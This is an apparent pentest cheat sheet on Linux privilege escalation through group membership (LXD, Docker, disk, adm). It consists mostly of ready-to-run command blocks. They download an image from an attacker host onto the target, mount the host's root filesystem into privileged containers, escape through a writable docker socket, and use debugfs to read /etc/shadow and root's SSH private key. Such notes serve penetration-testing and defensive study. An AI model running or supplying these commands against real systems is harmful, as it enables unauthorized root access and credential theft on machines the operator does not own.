# Groups

### **LXC / LXD**

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`.

```shellscript
# Check our groups
id

# List all images and check if a container image already exists
lxc image list

# If there are no containers, build a new image on our attacker machine
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000

# On the target machine, download the “alpine-*.tar.gz” and import it
wget http://<local-ip>:8000/alpine-v3.17-x86_64-20221206_0615.tar.gz
lxc image import ./alpine-v3.17-x86_64-20221206_0615.tar.gz --alias <IMAGE_NAME>

# Check that the image has been imported
lxc image list

# Initiate the image with security.privileged and specify the root path
lxc init <IMAGE_NAME> <CONTAINER_NAME> -c security.privileged=true

# If we get the error “No storage pool found. Please create a new storage pool.” in the
# step above, initialize the lxd at first with default values when prompted then repeat
lxd init

# Mount the new container to the root directory
lxc config device add <CONTAINER_NAME> host-root disk source=/ path=/mnt/root recursive=true

# Start the container, spawn a shell and we have access to /root on /mnt/root
lxc start <CONTAINER_NAME>
lxc exec <CONTAINER_NAME> /bin/bash     
```

### Docker

#### Create a new container

```shellscript
# Mount the root file system to the docker container 
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# If the system does not have internet, check available images and change the above
docker image ls 
```

#### Docker sockets - escape

A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon. When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.

<mark style="background-color:$danger;">Those files can contain very useful information for us that we can use to escape the Docker container</mark>

```shellscript
# Download the docker binary to the container
https://master.dockerproject.com/linux/x86_64/docker

# Enumerate what docker containers are already running => Look for an image in use
<PATH_TO_DOCKER_BINARY> -H unix:///app/<SOCK_FILE> ps

# Create our own container that maps the host's root to the container /hostsystem directory
<PATH_TO_DOCKER_BINARY> -H unix:///app/<SOCK_FILE> run --rm -d --privileged -v /:/hostsystem <EXISTING_IMAGE>

# Check that the container was created
<PATH_TO_DOCKER_BINARY> -H unix:///app/<SOCK_FILE> ps

# Get a shell on the new container
<PATH_TO_DOCKER_BINARY> -H unix:///app/<SOCK_FILE> exec -it <CONTAINER_ID> /bin/bash
```

#### Writeable docker socket

Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```shellscript
# List which images we can access
docker image ls

# Create a new container with root privileges
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <IMAGE> chroot /mnt bash
```

### Disk

```shellscript
# Check the disks => look for the partition where the root is mounted
df -h

# Examine the content of the partition in read only
debugfs /dev/<PARTITION>
mkdir test
cat /root/.ssh/id_rsa
cat /etc/shadow
```

### Adm

Members of the `adm` group can read logs in `/var/log`. This does not directly root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs
